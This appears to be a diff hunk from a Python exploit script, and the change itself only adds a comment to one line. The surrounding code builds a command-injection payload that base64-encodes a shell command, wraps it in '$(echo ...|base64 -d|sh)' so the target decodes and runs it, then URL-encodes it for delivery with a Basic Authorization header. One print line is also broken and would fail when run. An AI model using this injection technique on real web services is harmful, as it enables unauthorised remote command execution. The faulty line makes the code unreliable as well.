@@ -11,7 +11,7 @@ base64_bytes = base64.urlsafe_b64encode(payload.encode("utf-8")) # encode the re
 base64_final = str(base64_bytes, "utf-8")
 print("\n [+] Payload encoded to base64: " % base64_final) # print it for manual 
 payload_before_url = "$(echo %s|base64 -d|sh)\"" % base64_final # takes the b64 payload, decodes back and executes
-payload_after_url = requote_uri(payload_before_url)
+payload_after_url = requote_uri(payload_before_url) #url encode :p
 print(payload_after_url)
 print("\n[ + ] base64 payload: %s , \n [+] url-encoded payload: %s" % (payload, payload_after_url)) 
 ## add header: Authorization: Basic X
